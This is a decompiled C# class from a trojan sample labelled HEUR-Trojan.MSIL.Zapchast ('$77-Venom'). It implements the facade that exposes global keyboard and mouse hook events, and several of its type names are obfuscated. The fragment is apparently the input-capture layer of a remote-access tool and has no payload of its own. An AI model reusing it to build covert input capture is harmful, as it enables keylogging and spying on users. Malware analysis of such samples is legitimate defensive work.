// Decompiled with JetBrains decompiler
// Type: xClient.Core.MouseKeyHook.Implementation.EventFacade
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Windows.Forms;

namespace xClient.Core.MouseKeyHook.Implementation
{
  internal abstract class EventFacade : 
    IKeyboardMouseEvents,
    뗇\uF769켑杺\uA7F2굀ﬦ붟џ与纐쥊즽\uF5A5Ｐꙕ\uE8FF呷埫\uFFFD,
    逑ᑟἒ㙕\uFFFDẙΆউ䤇떧東斲뙥㙪\u2318\uE451\u32F8擑Ό园,
    IDisposable
  {
    private KeyListener m_KeyListenerCache;
    private MouseListener m_MouseListenerCache;

    public event KeyEventHandler KeyDown
    {
      add => this.GetKeyListener().KeyDown += value;
      remove => this.GetKeyListener().KeyDown -= value;
    }

    public event KeyPressEventHandler KeyPress
    {
      add => this.GetKeyListener().KeyPress += value;
      remove => this.GetKeyListener().KeyPress -= value;
    }

    public event KeyEventHandler KeyUp
    {
      add => this.GetKeyListener().KeyUp += value;
      remove => this.GetKeyListener().KeyUp -= value;
    }

    public event MouseEventHandler MouseMove
    {
      add => this.GetMouseListener().MouseMove += value;
      remove => this.GetMouseListener().MouseMove -= value;
    }

    public event EventHandler<죋\u27F4\uA67E\uE7DF᪲躎齂蕞硰࠭孒ଈ\u28FDĘ롇휂\uE63F䨞䇁ဿ> MouseMoveExt
    {
      add => this.GetMouseListener().MouseMoveExt += value;
      remove => this.GetMouseListener().MouseMoveExt -= value;
    }

    public event MouseEventHandler MouseClick
    {
      add => this.GetMouseListener().MouseClick += value;
      remove => this.GetMouseListener().MouseClick -= value;
    }

    public event MouseEventHandler MouseDown
    {
      add => this.GetMouseListener().MouseDown += value;
      remove => this.GetMouseListener().MouseDown -= value;
    }

    public event EventHandler<죋\u27F4\uA67E\uE7DF᪲躎齂蕞硰࠭孒ଈ\u28FDĘ롇휂\uE63F䨞䇁ဿ> MouseDownExt
    {
      add => this.GetMouseListener().MouseDownExt += value;
      remove => this.GetMouseListener().MouseDownExt -= value;
    }

    public event MouseEventHandler MouseUp
    {
      add => this.GetMouseListener().MouseUp += value;
      remove => this.GetMouseListener().MouseUp -= value;
    }

    public event EventHandler<죋\u27F4\uA67E\uE7DF᪲躎齂蕞硰࠭孒ଈ\u28FDĘ롇휂\uE63F䨞䇁ဿ> MouseUpExt
    {
      add => this.GetMouseListener().MouseUpExt += value;
      remove => this.GetMouseListener().MouseUpExt -= value;
    }

    public event MouseEventHandler MouseWheel
    {
      add => this.GetMouseListener().MouseWheel += value;
      remove => this.GetMouseListener().MouseWheel -= value;
    }

    public event MouseEventHandler MouseDoubleClick
    {
      add => this.GetMouseListener().MouseDoubleClick += value;
      remove => this.GetMouseListener().MouseDoubleClick -= value;
    }

    public void Dispose()
    {
      if (this.m_MouseListenerCache != null)
        this.m_MouseListenerCache.Dispose();
      if (this.m_KeyListenerCache == null)
        return;
      this.m_KeyListenerCache.Dispose();
    }

    private KeyListener GetKeyListener()
    {
      KeyListener keyListenerCache = this.m_KeyListenerCache;
      if (keyListenerCache != null)
        return keyListenerCache;
      KeyListener keyListener = this.CreateKeyListener();
      this.m_KeyListenerCache = keyListener;
      return keyListener;
    }

    private MouseListener GetMouseListener()
    {
      MouseListener mouseListenerCache = this.m_MouseListenerCache;
      if (mouseListenerCache != null)
        return mouseListenerCache;
      MouseListener mouseListener = this.CreateMouseListener();
      this.m_MouseListenerCache = mouseListener;
      return mouseListener;
    }

    protected abstract MouseListener CreateMouseListener();

    protected abstract KeyListener CreateKeyListener();
  }
}
